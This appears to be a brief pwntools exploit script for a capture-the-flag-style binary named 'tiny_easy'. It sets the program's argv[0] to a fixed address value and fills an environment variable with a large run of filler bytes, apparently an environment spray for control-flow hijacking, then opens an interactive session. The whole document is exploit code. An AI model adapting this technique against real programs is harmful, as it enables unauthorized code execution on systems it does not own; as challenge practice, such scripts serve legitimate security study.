from pwn import *

p_env = {}
p_env['0'] = 'b'*0x500

p = process(p32(0x61616161),executable = "./tiny_easy",env = p_env)
p.interactive()


